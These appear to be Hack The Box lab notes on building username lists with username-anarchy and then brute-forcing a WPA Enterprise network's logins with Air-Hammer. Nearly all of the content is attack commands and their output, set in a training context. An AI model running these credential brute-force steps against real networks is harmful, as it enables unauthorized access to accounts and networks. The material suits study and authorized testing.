### Using username-anarchy

```sh
3kjS@htb[/htb]$ ./username-anarchy David Smith

david
davidsmith
david.smith
davidsmi
davismit
davids
d.smith
dsmith
sdavid
s.david
smithd
smith
smith.d
smith.david
ds
```

```sh
3kjS@htb[/htb]$ ./username-anarchy --list-formats
```

```sh
3kjS@htb[/htb]$ ./username-anarchy --country france --auto
```

```sh
3kjS@htb[/htb]$ ./username-anarchy --recognise j.smith

Recognising j.smith. This can take a while.
Username format j.smith recognised. Plugin name: f.last
```
### Performing the Attack

![](Generating%20Usernames-20261005-151759.png)

```sh
3kjS@htb[/htb]$ ./username-anarchy --recognise cindy.walker

Recognising cindy.walker. This can take a while.
Username format cindy.walker recognised. Plugin name: first.last
```

![](Generating%20Usernames-20261005-151822.png)

```sh
3kjS@htb[/htb]$ ./username-anarchy --input-file ./user-names.txt  --select-format first.last

sophia.rose
cindy.walker
david.hutson
stella.blair
```

```sh
#!/bin/bash

input_file="usernames.txt"
output_file="formatted_usernames.txt"
domain="HTB"

while IFS= read -r line; do
  echo "${domain}\\${line}" >> "$output_file"
done < "$input_file"
```

Finally, once we have compiled a list of potentially valid usernames, we can use [Air-Hammer](https://github.com/Wh1t3Rh1n0/air-hammer) to carry out an online brute-force attack against the WPA Enterprise network.

```sh
3kjS@htb[/htb]$ python2 /opt/air-hammer/air-hammer.py -i wlan1 -e HTB-Corp -p /opt/wordlist.txt -u formatted_usernames.txt
```

```sh
3kjS@htb[/htb]$ echo "HTB\sophia.rose" > user.txt 3kjS@htb[/htb]$ python2 /opt/air-hammer/air-hammer.py -i wlan1 -e HTB-Corp -p /opt/wordlist.txt -u user.txt
```
